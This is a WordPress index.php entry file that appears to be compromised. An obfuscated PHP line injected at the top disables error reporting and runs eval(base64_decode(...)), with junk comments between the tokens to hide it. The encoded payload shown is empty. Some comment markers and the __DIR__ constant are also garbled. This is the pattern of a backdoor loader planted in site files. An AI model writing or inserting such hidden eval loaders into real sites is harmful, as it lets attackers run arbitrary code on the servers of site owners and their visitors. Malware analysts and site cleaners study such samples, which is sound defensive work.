<?php /*-w(sYXn_=8-*/error_reporting(0); /*-Qd,hm~S-*/eval/*-1stE.}odlfP_`H0vbDZ+7GCVTCw,N(l.lXotBm-*/(/*-^q0Qe-*/base64_decode/*-blmqb)-*/(/*-QxyGc^-*/""/*-zkq(4-*/)/*-tG4hmp%)4-*/);?><?php
/
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require DIR . '/wp-blog-header.php';

?>
